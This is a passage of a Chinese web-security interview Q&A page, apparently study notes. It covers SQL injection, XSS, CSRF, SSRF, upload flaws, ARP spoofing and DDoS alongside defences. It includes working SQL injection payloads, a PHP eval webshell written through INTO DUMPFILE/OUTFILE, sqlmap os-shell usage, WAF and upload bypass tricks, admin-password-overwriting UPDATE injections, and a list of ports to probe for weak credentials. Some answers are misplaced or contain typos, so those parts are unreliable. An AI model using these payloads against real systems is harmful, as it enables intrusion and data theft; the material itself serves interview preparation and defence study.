+<p>CSRF是跨站请求伪造攻击，由客户端发起<br>SSRF是服务器端请求伪造，由服务器发起<br>重放攻击是将截获的数据包进行重放，达到身份认证等目的</p>
+<p><strong>36、说出至少三种业务逻辑漏洞，以及修复方式？</strong></p>
+<p><strong>密码找回漏洞</strong>中存在</p>
+<p>1）密码允许暴力破解、</p>
+<p>2）存在通用型找回凭证、</p>
+<p>3）可以跳过验证步骤、</p>
+<p>4）找回凭证可以拦包获取</p>
+<p>等方式来通过厂商提供的密码找回功能来得到密码。<br><strong>身份认证漏洞</strong>中最常见的是</p>
+<p>1）会话固定攻击</p>
+<p>2） Cookie 仿冒</p>
+<p>只要得到 Session 或 Cookie 即可伪造用户身份。<br><strong>验证码漏洞</strong>中存在</p>
+<p>1）验证码允许暴力破解</p>
+<p>2）验证码可以通过 Javascript 或者改包的方法来进行绕过</p>
+<p><strong>37、圈出下面会话中可能存在问题的项，并标注可能会存在的问题？</strong></p>
+<p>get /ecskins/demo.jsp?uid=2016031900&amp;keyword=”hello world”<br>HTTP/1.1Host:<strong><em>.com:82User-Agent:Mozilla/<br>5.0 Firefox/40Accept:text/css,/;q=0.1<br>Accept-Language:zh-CN;zh;q=0.8;en-US;q=0.5,en;q=0.3<br>Referer:http://****</em></strong>.com/eciop/orderForCC/<br>cgtListForCC.htm?zone=11370601&amp;v=145902<br>Cookie:myguid1234567890=1349db5fe50c372c3d995709f54c273d;<br>uniqueserid=session_OGRMIFIYJHAH5_HZRQOZAMHJ;<br>st_uid=N90PLYHLZGJXI-NX01VPUF46W;<br>status=True<br>Connection:keep-alive</p>
+<p>有写入权限的，构造联合查询语句使用using INTO OUTFILE，可以将查询的输出重定向到系统的文件中，这样去写入 WebShell<br>使用 sqlmap –os-shell 原理和上面一种相同，来直接获得一个 Shell，这样效率更高<br>通过构造联合查询语句得到网站管理员的账户和密码，然后扫后台登录后台，再在后台通过改包上传等方法上传 Shell</p>
+<p><strong>38、给你一个网站你是如何来渗透测试的?</strong><br>在获取书面授权的前提下。</p>
+<p><strong>39、sqlmap，怎么对一个注入点注入？</strong><br>1）如果是get型号，直接，sqlmap -u “诸如点网址”.<br>2) 如果是post型诸如点，可以sqlmap -u “注入点网址” –data=”post的参数”<br>3）如果是cookie，X-Forwarded-For等，可以访问的时候，用burpsuite抓包，注入处用号替换，放到文件里，然后sqlmap -r “文件地址”</p>
+<p><strong>40、nmap，扫描的几种方式</strong></p>
+<p><strong>41、sql注入的几种类型？</strong><br>1）报错注入<br>2）bool型注入<br>3）延时注入<br>4）宽字节注入<br><strong>42、报错注入的函数有哪些？ 10个</strong><br>1）and extractvalue(1, concat(0x7e,(select @@version),0x7e))】】】<br>2）通过floor报错 向下取整<br>3）+and updatexml(1, concat(0x7e,(secect @@version),0x7e),1)<br>4）.geometrycollection()select from test where id=1 and geometrycollection((select from(selectfrom(select user())a)b));<br>5）.multipoint()select from test where id=1 and multipoint((select from(select from(select user())a)b));<br>6）.polygon()select from test where id=1 and polygon((select from(select from(select user())a)b));<br>7）.multipolygon()select from test where id=1 and multipolygon((select from(select from(select user())a)b));<br>8）.linestring()select from test where id=1 and linestring((select from(select from(select user())a)b));<br>9）.multilinestring()select from test where id=1 and multilinestring((select from(select from(select user())a)b));<br>10）.exp()select from test where id=1 and exp(~(select * from(select user())a));</p>
+<p><strong>43、延时注入如何来判断？</strong><br>if(ascii(substr(“hello”, 1, 1))=104, sleep(5), 1)</p>
+<p><strong>44、盲注和延时注入的共同点？</strong><br>都是一个字符一个字符的判断</p>
+<p><strong>45、如何拿一个网站的webshell？</strong><br>上传，后台编辑模板，sql注入写文件，命令执行，代码执行，<br>一些已经爆出的cms漏洞，比如dedecms后台可以直接建立脚本文件，wordpress上传插件包含脚本文件zip压缩包等</p>
+<p><strong>46、sql注入写文件都有哪些函数？</strong><br>select ‘一句话’ into outfile ‘路径’<br>select ‘一句话’ into dumpfile ‘路径’<br>select ‘<?php eval($_POST[1]) ?>‘ into dumpfile  ‘d:\wwwroot\baidu.com\nvhack.php’;</p>
+<p><strong>47、如何防止CSRF?</strong><br>1,验证referer<br>2，验证token<br>详细：<a href="http://cnodejs.org/topic/5533dd6e9138f09b629674fd" target="_blank" rel="noopener">http://cnodejs.org/topic/5533dd6e9138f09b629674fd</a></p>
+<p><strong>48、owasp 漏洞都有哪些？</strong><br>1、SQL注入防护方法：<br>2、失效的身份认证和会话管理<br>3、跨站脚本攻击XSS<br>4、直接引用不安全的对象<br>5、安全配置错误<br>6、敏感信息泄露<br>7、缺少功能级的访问控制<br>8、跨站请求伪造CSRF<br>9、使用含有已知漏洞的组件<br>10、未验证的重定向和转发</p>
+<p><strong>49、SQL注入防护方法？</strong><br>1、使用安全的API<br>2、对输入的特殊字符进行Escape转义处理<br>3、使用白名单来规范化输入验证方法<br>4、对客户端输入进行控制，不允许输入SQL注入相关的特殊字符<br>5、服务器端在提交数据库进行SQL查询之前，对特殊字符进行过滤、转义、替换、删除。</p>
+<p><strong>50、代码执行，文件读取，命令执行的函数都有哪些？</strong></p>
+<p>1）代码执行：</p>
+<p>eval,preg_replace+/e,assert,call_user_func,call_user_func_array,create_function</p>
+<p>2）文件读取：</p>
+<p>file_get_contents(),highlight_file(),fopen(),read </p>
+<p>file(),fread(),fgetss(), fgets(),parse_ini_file(),show_source(),file()等<br>3)命令执行：</p>
+<p>system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open()</p>
+<p><strong>51、img标签除了onerror属性外，还有其他获取管理员路径的办法吗？</strong><br>src指定一个远程的脚本文件，获取referer</p>
+<p><strong>52、img标签除了onerror属性外，并且src属性的后缀名，必须以.jpg结尾，怎么获取管理员路径。</strong></p>
+<p>1）远程服务器修改apache配置文件，配置.jpg文件以php方式来解析<br>AddType application/x-httpd-php .jpg<br>&lt;img src=<a href="http://xss.tv/1.jpg" target="_blank" rel="noopener">http://xss.tv/1.jpg</a>&gt; 会以php方式来解析</p>
+<p><strong>53、为什么aspx木马权限比asp大？</strong></p>
+<p>aspx使用的是.net技术。IIS 中默认不支持，ASP只是脚本语言而已。入侵的时候asp的木马一般是guest权限…APSX的木马一般是users权限。</p>
+<p><strong>54、如何绕过waf？</strong></p>
+<ul>
+<li>大小写转换法</li>
+<li>干扰字符 <code>/*!*/</code></li>
+<li>编码 base64 unicode hex url ascll</li>
+<li>复参数</li>
+</ul>
+<p><strong>55、如何向服务器写入webshell？</strong></p>
+<ul>
+<li>各种上传漏洞</li>
+<li>mysql具有写入权限,用sql语句写入shell</li>
+<li>http put方法</li>
+</ul>
+<p><strong>56、渗透测试中常见的端口</strong></p>
+<p>1,web类(web漏洞/敏感目录)<br>第三方通用组件漏洞struts thinkphp jboss ganglia zabbix</p>
+<pre><code>80 web 
+80-89 web 
+8000-9090 web</code></pre><p>2,数据库类(扫描弱口令)</p>
+<pre><code>1433 MSSQL 
+1521 Oracle 
+3306 MySQL 
+5432 PostgreSQL </code></pre><p>3,特殊服务类(未授权/命令执行类/漏洞)</p>
+<pre><code>443 SSL心脏滴血 
+873 Rsync未授权 
+5984 CouchDB http://xxx:5984/_utils/ 
+6379 redis未授权 
+7001,7002 WebLogic默认弱口令，反序列 
+9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞 
+11211 memcache未授权访问 
+27017,27018 Mongodb未授权访问 
+50000 SAP命令执行 
+50070,50030 hadoop默认端口未授权访问</code></pre><p>4,常用端口类(扫描弱口令/端口爆破)</p>
+<pre><code>21 ftp 
+22 SSH 
+23 Telnet 
+2601,2604 zebra路由，默认密码zebra
+3389 远程桌面</code></pre><blockquote>
+<p>端口合计详情</p>
+</blockquote>
+<pre><code>21 ftp 
+22 SSH 
+23 Telnet 
+80 web 
+80-89 web 
+161 SNMP 
+389 LDAP 
+443 SSL心脏滴血以及一些web漏洞测试 
+445 SMB 
+512,513,514 Rexec 
+873 Rsync未授权 
+1025,111 NFS 
+1433 MSSQL 
+1521 Oracle:(iSqlPlus Port:5560,7778) 
+2082/2083 cpanel主机管理系统登陆 （国外用较多）
+2222 DA虚拟主机管理系统登陆 （国外用较多） 
+2601,2604 zebra路由，默认密码zebra
+3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了 
+3306 MySQL 
+3312/3311 kangle主机管理系统登陆 
+3389 远程桌面 
+4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网 
+5432 PostgreSQL 
+5900 vnc 
+5984 CouchDB http://xxx:5984/_utils/ 
+6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网 
+6379 redis未授权 
+7001,7002 WebLogic默认弱口令，反序列 
+7778 Kloxo主机控制面板登录 
+8000-9090 都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上 
+8080 tomcat/WDCP主机管理系统，默认弱口令 
+8080,8089,9090 JBOSS 
+8083 Vestacp主机管理系统 （国外用较多） 
+8649 ganglia 
+8888 amh/LuManager 主机管理系统默认端口 
+9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞 
+10000 Virtualmin/Webmin 服务器虚拟主机管理系统 
+11211 memcache未授权访问 
+27017,27018 Mongodb未授权访问 
+28017 mongodb统计页面 
+50000 SAP命令执行 
+50070,50030 hadoop默认端口未授权访问</code></pre><h2 id="深信服一面"><a href="#深信服一面" class="headerlink" title=" 深信服一面:"></a><span id="head8"> 深信服一面:</span></h2><ul>
+<li>了解哪些漏洞</li>
+<li>文件上传有哪些防护方式</li>
+<li>用什么扫描端口，目录</li>
+<li>如何判断注入</li>
+<li>注入有防护怎么办</li>
+<li>有没有写过tamper</li>
+<li>3306 1443 8080是什么端口</li>
+<li>计算机网络从物理层到应用层xxxx</li>
+<li>有没有web服务开发经验</li>
+<li>如何向服务器写入webshell</li>
+<li>有没有用过xss平台</li>
+<li>网站渗透的流程</li>
+<li>mysql两种提权方式（udf，？）</li>
+<li>常见加密方式xxx</li>
+<li>ddos如何防护</li>
+<li>有没有抓过包，会不会写wireshark过滤规则</li>
+<li>清理日志要清理哪些</li>
+</ul>
+<h2 id="SQL注入防护"><a href="#SQL注入防护" class="headerlink" title=" SQL注入防护"></a><span id="head9"> SQL注入防护</span></h2><p>1、使用安全的API<br>2、对输入的特殊字符进行Escape转义处理<br>3、使用白名单来规范化输入验证方法<br>4、对客户端输入进行控制，不允许输入SQL注入相关的特殊字符<br>5、服务器端在提交数据库进行SQL查询之前，对特殊字符进行过滤、转义、替换、删除。<br>\6. 规范编码,字符集</p>
+<h2 id="为什么参数化查询可以防止sql注入"><a href="#为什么参数化查询可以防止sql注入" class="headerlink" title=" 为什么参数化查询可以防止sql注入"></a><span id="head10"> 为什么参数化查询可以防止sql注入</span></h2><p>原理:</p>
+<p>使用参数化查询数据库服务器不会把参数的内容当作sql指令的一部分来执行，是在数据库完成sql指令的编译后才套用参数运行</p>
+<p>简单的说:<br>参数化能防注入的原因在于,语句是语句，参数是参数，参数的值并不是语句的一部分，数据库只按语句的语义跑</p>
+<h2 id="SQL头注入点"><a href="#SQL头注入点" class="headerlink" title=" SQL头注入点"></a><span id="head11"> SQL头注入点</span></h2><pre><code>UA
+REFERER
+COOKIE
+IP</code></pre><h2 id="盲注是什么？怎么盲注？"><a href="#盲注是什么？怎么盲注？" class="headerlink" title=" 盲注是什么？怎么盲注？"></a><span id="head12"> 盲注是什么？怎么盲注？</span></h2><p>盲注是在SQL注入攻击过程中，服务器关闭了错误回显，我们单纯通过服务器返回内容的变化来判断是否存在SQL注入和利用的方式。盲注的手段有两种，一个是通过页面的返回内容是否正确(boolean-based)，来验证是否存在注入。一个是通过sql语句处理时间的不同来判断是否存在注入(time-based)，在这里，可以用benchmark，sleep等造成延时效果的函数，也可以通过构造大笛卡儿积的联合查询表来达到延时的目的。</p>
+<h2 id="宽字节注入产生原理以及根本原因"><a href="#宽字节注入产生原理以及根本原因" class="headerlink" title=" 宽字节注入产生原理以及根本原因"></a><span id="head13"> 宽字节注入产生原理以及根本原因</span></h2><h3 id="产生原理"><a href="#产生原理" class="headerlink" title=" 产生原理"></a><span id="head14"> 产生原理</span></h3><p>在数据库使用了宽字符集而WEB中没考虑这个问题的情况下，在WEB层，由于0XBF27是两个字符，在PHP中比如addslash和magic_quotes_gpc开启时，由于会对0x27单引号进行转义，因此0xbf27会变成0xbf5c27,而数据进入数据库中时，由于0XBF5C是一个另外的字符，因此\转义符号会被前面的bf带着”吃掉”，单引号由此逃逸出来可以用来闭合语句。</p>
+<h3 id="在哪里编码"><a href="#在哪里编码" class="headerlink" title=" 在哪里编码"></a><span id="head15"> 在哪里编码</span></h3><h3 id="根本原因"><a href="#根本原因" class="headerlink" title=" 根本原因"></a><span id="head16"> 根本原因</span></h3><p>character_set_client(客户端的字符集)和character_set_connection(连接层的字符集)不同,或转换函数如，iconv、mb_convert_encoding使用不当。</p>
+<h3 id="解决办法"><a href="#解决办法" class="headerlink" title=" 解决办法"></a><span id="head17"> 解决办法</span></h3><p>统一数据库、Web应用、操作系统所使用的字符集，避免解析产生差异，最好都设置为UTF-8。<br>或对数据进行正确的转义，如mysql_real_escape_string+mysql_set_charset的使用。</p>
+<h3 id="sql里面只有update怎么利用"><a href="#sql里面只有update怎么利用" class="headerlink" title=" sql里面只有update怎么利用"></a><span id="head18"> sql里面只有update怎么利用</span></h3><p>先理解这句 SQL</p>
+<pre><code>UPDATE user SET password=&#39;MD5($password)&#39;, homepage=&#39;$homepage&#39; WHERE id=&#39;$id&#39;</code></pre><p>如果此 SQL 被修改成以下形式，就实现了注入</p>
+<p>1：修改 homepage 值为<code>http://xxx.net&#39;, userlevel=&#39;3</code></p>
+<p>之后 SQL 语句变为</p>
+<pre><code>UPDATE user SET password=&#39;mypass&#39;, homepage=&#39;http://xxx.net&#39;, userlevel=&#39;3&#39; WHERE id=&#39;$id&#39;</code></pre><p>userlevel 为用户级别</p>
+<p>2:修改 password 值为<code>mypass)&#39; WHERE username=&#39;admin&#39;#</code></p>
+<p>之后 SQL 语句变为</p>
+<pre><code>UPDATE user SET password=&#39;MD5(mypass)&#39; WHERE username=&#39;admin&#39;#)&#39;, homepage=&#39;$homepage&#39; WHERE id=&#39;$id&#39;</code></pre><p>3：修改 id 值为<code>&#39; OR username=&#39;admin&#39;</code><br>之后 SQL 语句变为</p>
+<pre><code>UPDATE user SET password=&#39;MD5($password)&#39;, homepage=&#39;$homepage&#39; WHERE id=&#39;&#39; OR username=&#39;admin&#39;</code></pre><h2 id="sql如何写shell-单引号被过滤怎么办"><a href="#sql如何写shell-单引号被过滤怎么办" class="headerlink" title=" sql如何写shell/单引号被过滤怎么办"></a><span id="head19"> sql如何写shell/单引号被过滤怎么办</span></h2><p>写shell: root权限，GPC关闭，知道文件路径<br>outfile函数</p>
+<pre><code>`http://127.0.0.1:81/sqli.php?id=1 into outfile &#39;C:\\wamp64\\www\\phpinfo.php&#39; FIELDS TERMINATED BY &#39;&lt;?php phpinfo(); ?&gt;&#39;`
+
+`http://127.0.0.1:81/sqli.php?id=-1 union select 1,0x3c3f70687020706870696e666f28293b203f3e,3,4 into outfile &#39;C:\\wamp64\\www\\phpinfo.php&#39;`</code></pre><p>宽字节注入</p>
+<h3 id="代替空格的方法"><a href="#代替空格的方法" class="headerlink" title=" 代替空格的方法"></a><span id="head20"> 代替空格的方法</span></h3><p>%0a、%0b、%a0 等<br>/**/ 等注释符<br>&lt;&gt;</p>
+<h3 id="mysql的网站注入，5-0以上和5-0以下有什么区别？"><a href="#mysql的网站注入，5-0以上和5-0以下有什么区别？" class="headerlink" title=" mysql的网站注入，5.0以上和5.0以下有什么区别？"></a><span id="head21"> mysql的网站注入，5.0以上和5.0以下有什么区别？</span></h3><p>5.0以下没有information_schema这个系统表，无法列表名等，只能暴力跑表名。</p>
+<p>5.0以下是多用户单操作，5.0以上是多用户多操做。</p>
+<h1 id="XSS"><a href="#XSS" class="headerlink" title=" XSS"></a><span id="head22"> XSS</span></h1><h2 id="XSS原理"><a href="#XSS原理" class="headerlink" title=" XSS原理"></a><span id="head23"> XSS原理</span></h2><h3 id="反射型"><a href="#反射型" class="headerlink" title=" 反射型"></a><span id="head24"> 反射型</span></h3><p>用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。<br>需要诱使用户“点击”一个恶意链接，才能攻击成功</p>
+<h3 id="储存型"><a href="#储存型" class="headerlink" title=" 储存型"></a><span id="head25"> 储存型</span></h3><p>存储型XSS会把用户输入的数据“存储”在服务器端。<br>这种XSS具有很强的稳定性。</p>
+<h3 id="DOM型"><a href="#DOM型" class="headerlink" title=" DOM型"></a><span id="head26"> DOM型</span></h3><p>通过修改页面的DOM节点形成的XSS，称之为DOM Based XSS。</p>
+<h2 id="DOM型和反射型的区别"><a href="#DOM型和反射型的区别" class="headerlink" title=" DOM型和反射型的区别"></a><span id="head27"> DOM型和反射型的区别</span></h2><p>反射型XSS：通过诱导用户点击，我们构造好的恶意payload才会触发的XSS。<br>反射型XSS的检测我们在每次请求带payload的链接时页面应该是会带有特定的畸形数据的。<br>DOM型：通过修改页面的DOM节点形成的XSS。<br>DOM-based XSS由于是通过js代码进行dom操作产生的XSS，所以在请求的响应中我们甚至不一定会得到相应的畸形数据。<br>根本区别在我看来是输出点的不同。</p>
+<h2 id="DOM型XSS-自动化测试或人工测试"><a href="#DOM型XSS-自动化测试或人工测试" class="headerlink" title="DOM型XSS 自动化测试或人工测试"></a><span id="head28">DOM型XSS 自动化测试或人工测试</span></h2><p>人工测试思路：找到类似document.write、innerHTML赋值、outterHTML赋值、window.location操作、写javascript:后内容、eval、setTimeout 、setInterval 等直接执行之类的函数点。找到其变量，回溯变量来源观察是否可控，是否经过安全函数。<br>自动化测试参看道哥的博客，思路是从输入入手，观察变量传递的过程，最终检查是否有在危险函数输出，中途是否有经过安全函数。但是这样就需要有一个javascript解析器，否则会漏掉一些通过js执行带入的部分内容。</p>
+<p>在回答这段问题的时候，由于平时对客户的检测中，基本是凭借不同功能点的功能加上经验和直觉来进行检测，对不同类型的XSS检测方式实际上并没有太过细分的标准化检测方式，所以回答的很烂。。。</p>
+<h2 id="如何快速发现xss位置"><a href="#如何快速发现xss位置" class="headerlink" title=" 如何快速发现xss位置"></a><span id="head29"> 如何快速发现xss位置</span></h2><h2 id="对于XSS怎么修补建议"><a href="#对于XSS怎么修补建议" class="headerlink" title=" 对于XSS怎么修补建议"></a><span id="head30"> 对于XSS怎么修补建议</span></h2><p>输入点检查：对用户输入的数据进行合法性检查，使用filter过滤敏感字符或对进行编码转义，针对特定类型数据进行格式检查。针对输入点的检查最好放在服务器端实现。</p>
+<p>输出点检查：对变量输出到HTML页面中时，对输出内容进行编码转义，输出在HTML中时，对其进行HTMLEncode，如果输出在Javascript脚本中时，对其进行JavascriptEncode。<br>对使用JavascriptEncode的变量都放在引号中并转义危险字符，data部分就无法逃逸出引号外成为code的一部分。还可以使用更加严格的方法，对所有数字字母之外的字符都使用十六进制编码。此外，要注意在浏览器中，HTML的解析会优先于Javascript的解析，编码的方式也需要考虑清楚，针对不同的输出点，我们防御XSS的方法可能会不同，这点可能在之后的文章会做下总结。</p>
+<p>除此之外，还有做HTTPOnly对Cookie劫持做限制。</p>
+<h2 id="XSS蠕虫的产生条件"><a href="#XSS蠕虫的产生条件" class="headerlink" title=" XSS蠕虫的产生条件"></a><span id="head31"> XSS蠕虫的产生条件</span></h2><p>正常情况下，一个是产生XSS点的页面不属于self页面，用户之间产生交互行为的页面，都可能造成XSS Worm的产生。<strong>不一定需要</strong>存储型XSS</p>
+<h1 id="CSRF"><a href="#CSRF" class="headerlink" title=" CSRF"></a><span id="head32"> CSRF</span></h1><h2 id="CSRF原理"><a href="#CSRF原理" class="headerlink" title=" CSRF原理"></a><span id="head33"> CSRF原理</span></h2><p>CSRF是跨站请求伪造攻击，由客户端发起,是由于没有在关键操作执行时进行是否由用户自愿发起的确认</p>
+<h2 id="防御"><a href="#防御" class="headerlink" title=" 防御"></a><span id="head34"> 防御</span></h2><ul>
+<li>验证Referer</li>
+<li>添加token</li>
+</ul>
+<h2 id="token和referer做横向对比，谁安全等级高？"><a href="#token和referer做横向对比，谁安全等级高？" class="headerlink" title=" token和referer做横向对比，谁安全等级高？"></a><span id="head35"> token和referer做横向对比，谁安全等级高？</span></h2><p>token安全等级更高，因为并不是任何服务器都可以取得referer，如果从HTTPS跳到HTTP，也不会发送referer。并且FLASH一些版本中可以自定义referer。<br>但是token的话，要保证其足够随机且不可泄露。(不可预测性原则)</p>
+<h2 id="对referer的验证，从什么角度去做？如果做，怎么杜绝问题"><a href="#对referer的验证，从什么角度去做？如果做，怎么杜绝问题" class="headerlink" title=" 对referer的验证，从什么角度去做？如果做，怎么杜绝问题"></a><span id="head36"> 对referer的验证，从什么角度去做？如果做，怎么杜绝问题</span></h2><p>对header中的referer的验证，一个是空referer，一个是referer过滤或者检测不完善。<br>为了杜绝这种问题，在验证的白名单中，正则规则应当写完善。</p>
+<h2 id="针对token，对token测试会注意哪方面内容，会对token的哪方面进行测试？"><a href="#针对token，对token测试会注意哪方面内容，会对token的哪方面进行测试？" class="headerlink" title=" 针对token，对token测试会注意哪方面内容，会对token的哪方面进行测试？"></a><span id="head37"> 针对token，对token测试会注意哪方面内容，会对token的哪方面进行测试？</span></h2><p>引用一段请教前辈的回答：</p>
+<pre><code>针对token的攻击，一是对它本身的攻击，重放测试一次性、分析加密规则、校验方式是否正确等，二是结合信息泄露漏洞对它的获取，结合着发起组合攻击
+信息泄露有可能是缓存、日志、get，也有可能是利用跨站
+很多跳转登录的都依赖token，有一个跳转漏洞加反射型跨站就可以组合成登录劫持了
+另外也可以结合着其它业务来描述token的安全性及设计不好怎么被绕过比如抢红包业务之类的</code></pre><h1 id="SSRF"><a href="#SSRF" class="headerlink" title=" SSRF"></a><span id="head38"> SSRF</span></h1><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
+<p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p>
+<h2 id="检测"><a href="#检测" class="headerlink" title=" 检测"></a><span id="head39"> 检测</span></h2><p>SSRF漏洞的验证方法：</p>
+<p>1）因为SSRF漏洞是让服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器的发送的，从而来判断是否存在SSRF漏洞</p>
+<p>2）在页面源码中查找访问的资源地址 ，如果该资源地址类型为 <a href="http://www.baidu.com/xxx.php?image=（地址）的就可能存在SSRF漏洞" target="_blank" rel="noopener">www.baidu.com/xxx.php?image=（地址）的就可能存在SSRF漏洞 4</a></p>
+<h2 id="SSRF漏洞的成因-防御-绕过"><a href="#SSRF漏洞的成因-防御-绕过" class="headerlink" title="SSRF漏洞的成因 防御 绕过"></a><span id="head40">SSRF漏洞的成因 防御 绕过</span></h2><p>成因：模拟服务器对其他服务器资源进行请求，没有做合法性验证。<br>利用：构造恶意内网IP做探测，或者使用其余所支持的协议对其余服务进行攻击。<br>防御：禁止跳转，限制协议，内外网限制，URL限制。<br>绕过：使用不同协议，针对IP，IP格式的绕过，针对URL，恶意URL增添其他字符，@之类的。301跳转+dns rebindding。</p>
+<h1 id="上传"><a href="#上传" class="headerlink" title=" 上传"></a><span id="head41"> 上传</span></h1><h2 id="文件上传漏洞原理"><a href="#文件上传漏洞原理" class="headerlink" title=" 文件上传漏洞原理"></a><span id="head42"> 文件上传漏洞原理</span></h2><p>由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致用户可以越过其本身权限向服务器上传可执行的动态脚本文件</p>
+<h2 id="常见的上传绕过方式"><a href="#常见的上传绕过方式" class="headerlink" title=" 常见的上传绕过方式"></a><span id="head43"> 常见的上传绕过方式</span></h2><ul>
+<li>前端js验证：禁用js/burp改包</li>
+<li>大小写</li>
+<li>双重后缀名</li>
+<li>过滤绕过 pphphp-&gt;php</li>
+</ul>
+<h2 id="防护"><a href="#防护" class="headerlink" title=" 防护"></a><span id="head44"> 防护</span></h2><ul>
+<li>文件上传目录设置为不可执行</li>
+<li>使用白名单判断文件上传类型</li>
+<li>用随机数改写文件名和路径</li>
+</ul>
+<h2 id="审查上传点的元素有什么意义？"><a href="#审查上传点的元素有什么意义？" class="headerlink" title=" 审查上传点的元素有什么意义？"></a><span id="head45"> 审查上传点的元素有什么意义？</span></h2><p>有些站点的上传文件类型的限制是在前端实现的，这时只要增加上传类型就能突破限制了。</p>
+<h1 id="文件包含"><a href="#文件包含" class="headerlink" title=" 文件包含"></a><span id="head46"> 文件包含</span></h1><h2 id="原理"><a href="#原理" class="headerlink" title=" 原理"></a><span id="head47"> 原理</span></h2><p>引入一段用户能控制的脚本或代码，并让服务器端执行<br>（1）include()等函数通过动态变量的方式引入需要包含的文件；<br>（2）用户能够控制该动态变量。</p>
+<h2 id="导致文件包含的函数"><a href="#导致文件包含的函数" class="headerlink" title=" 导致文件包含的函数"></a><span id="head48"> 导致文件包含的函数</span></h2><p>PHP：include(), include_once(), require(), re-quire_once(), fopen(), readfile(), …<br>JSP/Servlet：ava.io.File(), java.io.Fil-eReader(), …<br>ASP：include file, include virtual,</p>
+<h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title=" 本地文件包含"></a><span id="head49"> 本地文件包含</span></h2><p>能够打开并包含本地文件的漏洞，被称为本地文件包含漏洞</p>
+<h1 id="XXE"><a href="#XXE" class="headerlink" title=" XXE"></a><span id="head50"> XXE</span></h1><h1 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title=" 逻辑漏洞"></a><span id="head51"> 逻辑漏洞</span></h1><h2 id="金融行业常见逻辑漏洞"><a href="#金融行业常见逻辑漏洞" class="headerlink" title=" 金融行业常见逻辑漏洞"></a><span id="head52"> 金融行业常见逻辑漏洞</span></h2><p>单针对金融业务的<br>主要是数据的篡改(涉及金融数据，或部分业务的判断数据)，由竞争条件或者设计不当引起的薅羊毛，交易/订单信息泄露，水平越权对别人的账户查看或恶意操作，交易或业务步骤绕过。</p>
+<h1 id="溢出"><a href="#溢出" class="headerlink" title=" 溢出"></a><span id="head53"> 溢出</span></h1><h1 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title=" 中间人攻击"></a><span id="head54"> 中间人攻击</span></h1><p>中间人攻击是一个（缺乏）相互认证的攻击；由于客户端与服务器之间在SSL握手的过程中缺乏相互认证而造成的漏洞</p>
+<p>防御中间人攻击的方案通常基于一下几种技术</p>
+<p>1.公钥基础建设PKI<br>使用PKI相互认证机制，客户端验证服务器，服务器验证客户端；上述两个例子中都是只验证服务器，这样就造成了SSL握手环节的漏洞，而如果使用相互认证的的话，基本可以更强力的相互认证</p>
+<p>2.延迟测试</p>
+<p>使用复杂加密哈希函数进行计算以造成数十秒的延迟；如果双方通常情况下都要花费20秒来计算，并且整个通讯花费了60秒计算才到达对方，这就能表明存在第三方中间人。</p>
+<p>3.使用其他形式的密钥交换形式</p>
+<h2 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title=" ARP欺骗"></a><span id="head55"> ARP欺骗</span></h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title=" 原理:"></a><span id="head56"> 原理:</span></h3><p>每台主机都有一个ARP缓存表，缓存表中记录了IP地址与MAC地址的对应关系，而局域网数据传输依靠的是MAC地址。<br>在ARP缓存表机制存在一个缺陷，就是当请求主机收到ARP应答包后，不会去验证自己是否向对方主机发送过ARP请求包，就直接把这个返回包中的IP地址与MAC地址的对应关系保存进ARP缓存表中，如果原有相同IP对应关系，原有的则会被替换。这样攻击者就有了偷听主机传输的数据的可能</p>
+<h3 id="防护-1"><a href="#防护-1" class="headerlink" title=" 防护"></a><span id="head57"> 防护</span></h3><p>1.在主机绑定网关MAC与IP地址为静态（默认为动态），命令：arp -s 网关IP 网关MAC</p>
+<p>2.在网关绑定主机MAC与IP地址</p>
+<p>3.使用ARP防火墙</p>
+<h1 id="DDOS"><a href="#DDOS" class="headerlink" title=" DDOS"></a><span id="head58"> DDOS</span></h1><h2 id="Ddos原理"><a href="#Ddos原理" class="headerlink" title=" Ddos原理"></a><span id="head59"> Ddos原理</span></h2><p>利用合理的请求造成资源过载，导致服务不可用</p>
+<h3 id="syn洪流的原理"><a href="#syn洪流的原理" class="headerlink" title=" syn洪流的原理"></a><span id="head60"> syn洪流的原理</span></h3><p>伪造大量的源IP地址，分别向服务器端发送大量的SYN包，此时服务器端会返回SYN/ACK包，因为源地址是伪造的，所以伪造的IP并不会应答，服务器端没有收到伪造IP的回应，会重试3～5次并且等待一个SYNTime（一般为30秒至2分钟），如果超时则丢弃这个连接。攻击者大量发送这种伪造源地址的SYN请求，服务器端将会消耗非常多的资源（CPU和内存）来处理这种半连接，同时还要不断地对这些IP进行SYN+ACK重试。最后的结果是服务器无暇理睬正常的连接请求，导致拒绝服务。</p>
+<h3 id="CC攻击原理"><a href="#CC攻击原理" class="headerlink" title=" CC攻击原理"></a><span id="head61"> CC攻击原理</span></h3><p>对一些消耗资源较大的应用页面不断发起正常的请求，以达到消耗服务端资源的目的。</p>
+<h2 id="DDOS防护"><a href="#DDOS防护" class="headerlink" title=" DDOS防护"></a><span id="head62"> DDOS防护</span></h2><p>SYN Cookie/SYN Proxy、safereset等算法。SYN Cookie的主要思想是为每一个IP地址分配一个“Cookie”，并统计每个IP地址的访问频率。如果在短时间内收到大量的来自同一个IP地址的数据包，则认为受到攻击，之后来自这个IP地址的包将被丢弃。</p>
